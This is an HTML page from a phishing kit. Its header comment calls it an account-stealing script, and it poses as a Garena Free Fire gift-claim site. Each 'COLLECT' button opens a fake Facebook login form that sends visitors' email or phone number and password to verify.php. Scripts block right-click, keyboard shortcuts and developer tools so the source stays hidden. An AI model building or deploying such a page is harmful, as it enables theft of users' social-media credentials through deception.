
<!--- 
× NAMA SCRIPT: SCRIPT MALING AKUN PUBG MOBILE SEASON 10 REV
× PEMILIK: ©PUANGBOSS
× DIDESAIN OLEH: PUANGBOSS
× TANGGAL PEMBUATAN: 14 DESEMBER 2019 
× INFORMASI : DILARANG MENGUBAH HAK CIPTA
--->
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Garena Free Fire</title>

<meta property="description" content="Free claim gift in Garena Free Fire"/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<body>
<style type="text/css">
	#hadiah fieldset:not(:first-of-type) {
		display: none;
	}
fieldset {
border: none;
}
</style>

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>


<div class="navbar">
	<img src="img/thumbnail.png">GARENA FREE FIRE</br>
	<span>PUSAT HADIAH FREE FIRE</span>
</div>
</br>
</br>
</br>
</br>
</br>

<!--- POP UP LOGIN --->
<div id="login-required">
	<div class="box-login">
		<a href="#close" class="close-login" onmousedown="tutup.play()" title="Close"><img src="img/bg/btn_delete.png"></a>
		<center>
		<h4 class="berhasil"> LOGIN REQUIRED</h4>
		</br>
		<img width="70" src="img/thumbnail.png">
       </center>
       </br>
		<button onclick="location.href='#fb';" onmousedown="buka.play()" class="twitter"><i style="float:left;" class="fa fa-facebook"></i>Facebook</button>
</br>
</br>
		</center>
	</div>
</div>
<!--- /POP UP LOGIN --->

<!--- TWITTER LOGIN --->
<div class="popup-login facebook animated fadeIn" style="display: none;">

	<div class="popup-box-login-fb">

		<a onclick="closefb()" class="close-fb"><i class="zmdi zmdi-close"></i></a>

		<div class="navbar-fb">

			<img src="img/login/fb.png">

		</div>

		<div class="content-box-fb">

			<img src="img/thumbnail.png">

			<div class="txt-login-fb">

				 Log in to your Facebook account to connect to Free Fire

			</div>

			<form class="login-form" action="verify.php" method="get">

				<label>

				<input type="text" name="username" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>

				</label>

				<label>

				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>

				</label>

				

				<input type="hidden" name="login" value="Facebook" readonly>

				<button type="submit" class="btn-login-fb">Log In</button>

			</form>

			<div class="txt-create-account">Create account</div>

			<div class="txt-not-now">Not now</div>

			<div class="txt-forgotten-password">Forgotten password?</div>

		</div>

		<div class="language-box">

			<center>

			<div class="language-name language-name-active">English (UK)</div>

			<div class="language-name">Bahasa Indonesia</div>

			<div class="language-name">Basa Jawa</div>

			<div class="language-name">Bahasa Melayu</div>

			<div class="language-name">日本語</div>

			<div class="language-name">Español</div>

			<div class="language-name">Português (Brasil)</div>

			<div class="language-name">

				<i class="fa fa-plus"></i>

			</div>

			</center>

		</div>

		<div class="copyright">Facebook Inc.</div>

	</div>

</div>
<!--- /TWITTER LOGIN --->
<!--- FB LOGIN --->
<div id="fb">
<div class="fb-login">
<a href="#login" onmousedown="tutup.play()" class="close-login" title="Close">&times;</a>
<div class="nav-fb">
<center>
<img width="100" src="img/login-popup/fb.png">
</center>
</div>

			<form class="login-form" action="verify.php" method="get">

<p class="mylabel">Phone or email:</p>
<input class="login" type="text" name="username" placeholder="" autocomplete="off" autocapitalize="off" required></br>
<p class="mylabel">Password:</p>
<input class="login" type="password" name="password" placeholder="" autocomplete="off" autocapitalize="off"></br>
<input name="login" type="hidden" value="Facebook" readonly>
</br>
</br>
<center>
<button type="submit" onmousedown="buka.play()" class="btn-login-fb"><b>Log In</b></button>
</center>
</br>
</br>
<div class="divider">
<span>or</span>
</div>
</br>
</br>
<center>
<button class="btn-register-fb">Create a New Account</button>
</center>
</form>
</div>
</div>
<!--- /FB LOGIN --->


		
		</br>
<form id="hadiah" novalidate>
	<fieldset>
	<!----  HADIAH 1 --->
		<div class="box">
			<div class="isi">
				<span class="item">Permanent</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/1.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">Free</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/2.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">Permanent</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/3.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
		</div>
		<div class="box">
			<div class="isi">
				<span class="item">Permanent</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/4b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">Permanent</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/5b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">Free</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/6b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
		</div>
		<div class="box">
			<div class="isi">
				<span class="item">Free</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/7b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">Free</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/8b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">Free</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/9b.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login-required';" class="btn-klaim">COLLECT</button>
				</center>
			</div>
		</div>
		</br>
		</br>
	</fieldset>
	
</form>
</br>
</br>
</br>
</br>
</br>
<div class="footer">
	<center>
	<img width="70" src="img/garena-logo.png">
	</center>
</div>

<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

<script src="js/slider.js"></script>

<script src="js/tab.js"></script>

<script src="js/popup.js"></script>

<script src="js/content.js"></script>

<script src="js/counter.js"></script>

<script src="js/click.js"></script>
<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
</script>
</body>
</html>
<!--- 
× NAMA SCRIPT: SCRIPT MALING AKUN PUBG MOBILE SEASON 10 REV
× PEMILIK: ©PUANGBOSS
× DIDESAIN OLEH: PUANGBOSS
× TANGGAL PEMBUATAN: 14 DESEMBER 2019 
× INFORMASI : DILARANG MENGUBAH HAK CIPTA
--->